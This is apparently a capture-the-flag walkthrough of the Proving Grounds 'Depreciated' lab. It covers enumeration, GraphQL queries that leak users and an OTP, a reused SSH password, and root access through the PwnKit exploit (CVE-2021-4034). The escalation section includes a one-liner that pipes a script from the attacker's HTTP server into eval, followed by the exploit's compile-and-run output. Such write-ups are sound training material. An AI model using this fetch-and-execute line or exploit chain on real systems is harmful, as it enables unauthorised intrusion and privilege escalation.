---
title: Proving Grounds - Depreciated
date: 2022-11-08
author: Marius
tags: [ctf, 'proving grounds', 'pg']
---
Depreciated is found in various OSCP prepare lists and in NetSecFocus Trophy list. Room is rated as intermediate, but is community rated this room as hard.

### Enumeration

```bash
└─$ rustscan -a 192.168.209.170 -- -sC -sV | tee nmap
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Under Maintainence
5132/tcp open  unknown syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
|     Enter Username:
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Enter Username: Enter OTP: Incorrect username or password
|   Help: 
|     Enter Username: Enter OTP:
|   RPCCheck: 
|     Enter Username: Traceback (most recent call last):
|     File "/opt/depreciated/messaging/messages.py", line 100, in <module>
|     main()
|     File "/opt/depreciated/messaging/messages.py", line 82, in main
|     username = input("Enter Username: ")
|     File "/usr/lib/python3.8/codecs.py", line 322, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq: 
|     Enter Username: Traceback (most recent call last):
|     File "/opt/depreciated/messaging/messages.py", line 100, in <module>
|     main()
|     File "/opt/depreciated/messaging/messages.py", line 82, in main
|     username = input("Enter Username: ")
|     File "/usr/lib/python3.8/codecs.py", line 322, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie: 
|     Enter Username: Traceback (most recent call last):
|     File "/opt/depreciated/messaging/messages.py", line 100, in <module>
|     main()
|     File "/opt/depreciated/messaging/messages.py", line 82, in main
|     username = input("Enter Username: ")
|     File "/usr/lib/python3.8/codecs.py", line 322, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
8433/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-
```

Started with web server. Running feroxbuster revealed no hidden directories. Homepage suggests to use port 5132 CLI which I have attempted to make connection to.

```
└─$ nc -nv 192.168.209.170 5132
(UNKNOWN) [192.168.209.170] 5132 (?) open
Enter Username: admin
Enter OTP: admin
Incorrect username or password
```
Attempted generic password/username combinations without any luck, but inspecting HTML of the webpage I did find some interesting information.

![alt text](/assets/img/depreciated/html-source.png)

I moved my investigation to the new directory http://192.168.209.170:8433/graphql

With query found in the hyperlink I have experimented a bit with trying out different queries and noticed that syntax help is enabled. By entering letters within brackets I got autocomplete suggestions and one of them was {listusers}

![alt text](/assets/img/depreciated/graphiql.png)

We now only need OTP to login to port 5132 CLI.  Playing around with GraphiQl I got autocomplete suggestion for getOPT function to request hopefully generate OTP. With syntax help I was able to construct a query.

```
{getOTP(username:"peter")}
```

![alt text](/assets/img/depreciated/graphiql2.png)

With these credentials I was able to login to the CLI and read peter's messages

```
└─$ nc -nv 192.168.209.170 5132
(UNKNOWN) [192.168.209.170] 5132 (?) open
Enter Username: peter
Enter OTP: ysvdzoSdDjcY1gYo
$ whoami
$ ?

list    list messages
create  create new message
exit    exit the messaging system
read    read the message with given id
update  update the message with given id
help    Show this help
                    
$ list
#2345		Improve the ticketing CLI syst
#1893		Staging keeps on crashing beca
#2347		[critical] The ticketing websi
#1277		Update the MySQL version, it's
#234		Hey, Please change your passwo
#0		Hey, Seriously this is getting
$ read 0
Not authorized to read
$ read 234
Message No: #234

Hey, Please change your password ASAP. You know the password policy, using weak password isn't allowed. And peter@safe is very weak, use https://password.kaspersky.com/ to check the strength of the password.

Attachment: none
$ read 1277
Not authorized to read
$ read 2347 
Not authorized to read
$ read 1893
Not authorized to read
$ read 2345
Not authorized to read
```

Peter:peter@safe 

Looks like peter ignored this message, because I was able to login via SSH with these credentials.

### Privilege Escalation

Once logged on I did some basic enumeration without interesting results so I fired up linpeas.

```
└─$ scp linpeas.sh peter@192.168.209.170:/tmp
```

CVE Check suggested that machine is vulnerable to [CVE-2021-4034](https://github.com/berdav/CVE-2021-4034).

On my machine I have cloned the repository and changed directory into the folder.

```
└─$ git clone https://github.com/berdav/CVE-2021-4034
└─$ cd CVE-2021-4034
```

On attacking machine I used onliner.

```
peter@depreciated:/tmp$ eval "$(curl -s http://192.168.49.209:4444/cve-2021-4034.sh)"
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
# whoami
root
# cd /root
# ls 
proof.txt  snap
```

Thats it. GG.

